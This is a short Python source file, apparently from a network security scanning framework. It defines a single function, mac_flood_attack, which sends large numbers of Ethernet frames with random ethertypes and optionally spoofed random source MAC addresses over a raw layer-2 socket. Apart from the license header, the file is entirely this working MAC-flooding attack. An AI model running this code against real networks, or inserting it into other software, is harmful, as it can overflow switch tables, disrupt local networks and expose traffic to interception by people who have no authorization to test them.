# Light-Scan Framework - Network Security Scanning Framework
# Copyright (C) 2026 Adam Boulaaz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
from scapy.libs import ethertypes

from LightMirage import mirage
from LightPacket import BROADCAST_MAC, Ethernet, L2Socket

def mac_flood_attack(count,target=None,hidesrc=False):
    for i in range(count):
        if hidesrc:
            packet = Ethernet(src=mirage.random_mac(),dst=target,ethertype=mirage.random_ethertype())
        else:
            if target is None:
                target = BROADCAST_MAC
            packet = Ethernet(dst=target,ethertype=mirage.random_ethertype())
        L2Socket().sendl2(packet)